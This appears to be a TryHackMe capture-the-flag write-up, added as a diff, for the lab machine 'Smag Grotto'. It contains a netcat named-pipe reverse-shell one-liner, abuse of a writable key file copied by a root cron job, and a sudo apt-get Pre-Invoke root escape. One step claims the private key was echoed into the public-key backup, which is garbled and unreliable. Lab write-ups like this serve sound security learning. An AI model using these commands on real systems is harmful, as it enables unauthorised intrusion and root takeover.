@@ -1,0 +1,133 @@
+Room Name:
+  Smag Grotto
+  https://tryhackme.com/room/smaggrotto
+ 
+Objective:
+   TO get root privileges and capture the flags. 
+ 
+Difficulty:
+  Easy
+  
+#Enumeration
+  As always, it's start with nmap
+  
+└──╼ $nmap -sC -sV smag.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 10:36 CDT
+Nmap scan report for smag.thm (10.10.205.248)
+Host is up (0.22s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Smag
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.42 seconds
+
+#web
+
+└──╼ $python3 dirsearch.py -u http://smag.thm/ -e *
+[10:39:34] 200 -  402B  - /index.php
+[10:39:34] 200 -  402B  - /index.php/login/
+[10:39:45] 301 -  303B  - /mail  ->  http://smag.thm/mail/
+[10:39:45] 200 -    2KB - /mail/
+
+  Download the pcap file and open with wireshark, we found the http request with the traffic login.php.
+  *4	0.000230	192.168.33.10	192.168.33.69	HTTP	268	POST /login.php HTTP/1.1  (application/x-www-form-urlencoded)
+  I found the credentials "username=h********k&password=c*********w"
+  Went further down found,
+  *6	0.001326	192.168.33.69	192.168.33.10	HTTP	213	HTTP/1.1 200 OK.
+  I found other URI for login page "http://development.smag.thm/login.php"
+  
+  I can't directly access the above url, so we need add the machine IP in our hosts ( /etc/hosts )
+  
+  There you will get login.php and applied with credentials it will redirect to admin.php,
+  
+#shell
+ 
+ It's shows "Enter a command" I check with listing directories and /etc/passwd it throwed nothing and last tried with reverse shell,
+ started nc listener in host machine
+  *nc -lvnp 1234
+ submit the reverse shell
+  *rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0IP 1234 >/tmp/f
+  
+  got the shell,
+  
+  $ id
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  
+  Next, went to jake home directory 
+  
+  $ ls -al
+  -rw-rw---- 1 jake jake   33 Jun  4 13:02 user.txt
+  cat user.txt
+    cat: user.txt: Permission denied
+  
+  then i run linpeas
+  
+  found backup key running behind in /opt directory  
+  
+      SHELL=/bin/sh
+      PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+      *  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+      
+  
+  went to /opt/.backups/
+  
+  $ ls -al
+  -rw-rw-rw- 1 root root  563 Aug  1 04:41 jake_id_rsa.pub.backup
+  
+  It's seems, i have write access.
+  
+  Here is the main part of the escaltion, we need to be jake to read the flag.
+  
+  In host machine i created ssh key 
+  
+  *ssh-keygen -f jake 
+  
+  i copied jake private key and try to edit the jake_id_rsa.pub.backup it throwed me out with permission denied. ( tried uploading the same file and creating new file nothing seems to be work, it went three days,
+  Then i had a chat with author jake and i asked the way i approached it seems to be correct and author suggested me do echo'ing the content ).
+  
+  $ echo "PRIVATE KEY" >> jake_id_rsa.pub.backup It's works well good 
+  
+  As cronjob says jake backups key copying to jake authorized keys
+  
+  #second shell
+  
+    └──╼ $ssh -i jake jake@10.10.30.251
+  
+  jake@smag:~$ ls -al
+    #user.txt
+      cat user.txt
+      i***************************j
+    
+    #root.txt
+      first, tried with sudo -l
+      User jake may run the following commands on smag:
+      (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+    
+      We dont password for binary to execute.
+    
+      *sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+      # id
+      uid=0(root) gid=0(root) groups=0(root)
+      # cat /root/root.txt
+      u***************************T
+      
+#credits
+  Thanks for making this room "JakeDoesSec" and it was fun.
+  Thankyou for reading.
+
+  
+  
+  
+ 
+  
+  
